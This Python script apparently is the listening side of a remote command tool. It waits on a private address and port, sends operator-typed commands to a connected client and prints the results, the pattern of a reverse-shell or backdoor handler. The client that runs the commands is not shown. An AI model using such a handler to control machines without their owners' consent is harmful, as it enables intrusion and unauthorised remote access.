import socket

HOST = "192.168.1.46"
PORT = 9090


def setup(HOST, PORT):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))

    print(f"Server hosted at {HOST}, PORT: {PORT}")
    print("Looking for connection")

    server.listen()

    client, adress = server.accept()

    print(f"Connected to {adress}")
    run(client)


def run(client):
    while True:
        rec = client.recv(1024).decode("utf-8")
        if rec == "req":
            cmd_input = input("Enter command: ")
            if cmd_input == "":
                continue
            elif cmd_input == "r":
                print(client.recv(32768).decode("utf-8"))
            elif cmd_input == "q":
                break
            try:
                client.send(cmd_input.encode("utf-8"))
                print(client.recv(8192).decode("utf-8"))
            except ConnectionResetError:
                print("Client has disconnected")
                break
        else:
            print(rec)
    input()


setup(HOST, PORT)
